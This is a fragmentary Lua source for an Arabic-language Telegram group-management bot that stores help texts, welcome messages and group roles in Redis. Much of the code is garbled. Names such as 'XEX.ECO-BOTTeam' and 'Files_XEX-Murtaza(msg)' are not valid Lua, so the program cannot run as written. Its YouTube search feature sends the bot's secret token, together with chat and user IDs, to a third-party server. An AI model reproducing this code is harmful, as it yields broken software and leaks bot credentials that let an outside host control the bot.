end
...
DevALS:set(XEX.ECO-BOT..'ALS:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local XEX.ECO-BOTTeam =  DevALS:get(XEX.ECO-BOT..'ALS:Help21'..msg.sender_user_id_)
if XEX.ECO-BOTTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:Help21'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT..'ALS:Help2', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevALS:set(XEX.ECO-BOT..'ALS:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local XEX.ECO-BOTTeam =  DevALS:get(XEX.ECO-BOT..'ALS:Help31'..msg.sender_user_id_)
if XEX.ECO-BOTTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:Help31'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT..'ALS:Help3', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevALS:set(XEX.ECO-BOT..'ALS:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local XEX.ECO-BOTTeam =  DevALS:get(XEX.ECO-BOT..'ALS:Help41'..msg.sender_user_id_)
if XEX.ECO-BOTTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:Help41'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT..'ALS:Help4', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
DevALS:set(XEX.ECO-BOT..'ALS:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local XEX.ECO-BOTTeam =  DevALS:get(XEX.ECO-BOT..'ALS:Help51'..msg.sender_user_id_)
if XEX.ECO-BOTTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:Help51'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT..'ALS:Help5', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevALS:set(XEX.ECO-BOT..'ALS:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local XEX.ECO-BOTTeam =  DevALS:get(XEX.ECO-BOT..'ALS:Help61'..msg.sender_user_id_)
if XEX.ECO-BOTTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:Help61'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT..'ALS:Help6', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
local Leave = DevALS:get(XEX.ECO-BOT..'ALS:Leave')
local Text = [[
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT.."ALS:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل اليوتيوب بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT.."ALS:WhyTube"..msg.chat_id_,true) 
return false  
end 
if text and text:match('^بحث (.*)$') and not DevALS:get(XEX.ECO-BOT.."ALS:WhyTube"..msg.chat_id_) and ChCheck(msg) then            
local Text = text:match('^بحث (.*)$') 
local msg_id = msg.id_/2097152/0.5 
https.request('https://ccccxcc.ml/XEX.ECO-BOT/Yt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source XEX.ECO-BOT     --
if SecondSudo(msg) then
...
local Users = DevALS:smembers(XEX.ECO-BOT.."User_Bot")
local Groups = DevALS:smembers(XEX.ECO-BOT..'Chek:Groups')
local Sudos = DevALS:smembers(XEX.ECO-BOT.."Sudo:User")
if DevALS:get(XEX.ECO-BOT..'Name:Bot') then
DevALS:set(XEX.ECO-BOT..'ALS:NameBot',(DevALS:get(XEX.ECO-BOT..'Name:Bot') or 'يوكا'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevALS:sadd(XEX.ECO-BOT..'ALS:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevALS:sadd(XEX.ECO-BOT..'ALS:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevALS:sadd(XEX.ECO-BOT..'ALS:Groups',Groups[i]) 
if DevALS:get(XEX.ECO-BOT.."Private:Group:Link"..Groups[i]) then
DevALS:set(XEX.ECO-BOT.."ALS:Groups:Links"..Groups[i],DevALS:get(XEX.ECO-BOT.."Private:Group:Link"..Groups[i]))
end
if DevALS:get(XEX.ECO-BOT.."Get:Welcome:Group"..Groups[i]) then
DevALS:set(XEX.ECO-BOT..'ALS:Groups:Welcomes'..Groups[i],DevALS:get(XEX.ECO-BOT.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevALS:smembers(XEX.ECO-BOT..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevALS:sadd(XEX.ECO-BOT.."ALS:Constructor:"..Groups[i], v)
end
local list3 = DevALS:smembers(XEX.ECO-BOT..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevALS:sadd(XEX.ECO-BOT.."ALS:BasicConstructor:"..Groups[i], v)
end
local list4 = DevALS:smembers(XEX.ECO-BOT..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevALS:sadd(XEX.ECO-BOT.."ALS:Managers:"..Groups[i], v)
end
local list5 = DevALS:smembers(XEX.ECO-BOT..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevALS:sadd(XEX.ECO-BOT.."ALS:Admins:"..Groups[i], v)
end
local list6 = DevALS:smembers(XEX.ECO-BOT..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevALS:sadd(XEX.ECO-BOT.."ALS:VipMem:"..Groups[i], v)
end
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..Groups[i],"del") DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevALS:set(XEX.ECO-BOT..Lock..Groups[i],true)
end
end
...
local Get_Files, res = https.request("https://raw.githubusercontent.com/XEX-Murtaza/Files_XEX-Murtaza/main/getfile.json")
if res == 200 then
...
local GetJson, Res = https.request("https://raw.githubusercontent.com/XEX-Murtaza/Files_XEX-Murtaza/main/Files_XEX-Murtaza/"..FileName)
if Res == 200 then
...
DevALS:del(XEX.ECO-BOT..'ALS:Text:BotWelcome')
DevALS:del(XEX.ECO-BOT..'ALS:Photo:BotWelcome')
return false
end 
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:BotWelcome')
return false
end 
...
DevALS:set(XEX.ECO-BOT..'ALS:Lock:BotWelcome',true)
return false
end 
...
DevALS:del(XEX.ECO-BOT..'ALS:Text:BotWelcome')
DevALS:del(XEX.ECO-BOT..'ALS:Photo:BotWelcome')
DevALS:set(XEX.ECO-BOT.."ALS:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevALS:get(XEX.ECO-BOT.."ALS:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء الامر", 1, "md") 
DevALS:del(XEX.ECO-BOT.."ALS:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ النص ارسل لي صورة الترحيب\n☆︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevALS:set(XEX.ECO-BOT.."ALS:Text:BotWelcome",text) 
DevALS:set(XEX.ECO-BOT.."ALS:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevALS:get(XEX.ECO-BOT.."ALS:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
...
DevALS:set(XEX.ECO-BOT.."ALS:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
...
DevALS:setex(XEX.ECO-BOT.."ALS:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
...
DevALS:del(XEX.ECO-BOT.."DevText")
end end
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء الامر", 1, "md") 
DevALS:del(XEX.ECO-BOT.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevALS:del(XEX.ECO-BOT.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevALS:set(XEX.ECO-BOT..'ALS:ChText',texxt)
...
DevALS:setex(XEX.ECO-BOT.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
...
DevALS:del(XEX.ECO-BOT..'ALS:ChText')
...
--     Source XEX.ECO-BOT     --
Files_XEX-Murtaza(msg)
--     Source XEX.ECO-BOT     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
DevALS:incr(XEX.ECO-BOT..'ALS:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..msg.chat_id_) and not Text and not ALSConstructor(result) then
...
local GetMsgPin = DevALS:get(XEX.ECO-BOT..'ALS:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevALS:del(XEX.ECO-BOT..'ALS:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevALS:del(XEX.ECO-BOT..'ALS:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=XEX.ECO-BOT,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevALS:srem(XEX.ECO-BOT..'ALS:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevALS:srem(XEX.ECO-BOT..'ALS:Groups',v)  
end
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Groups',v)  
end end,nil) end
end
--     Source XEX.ECO-BOT     --
end 
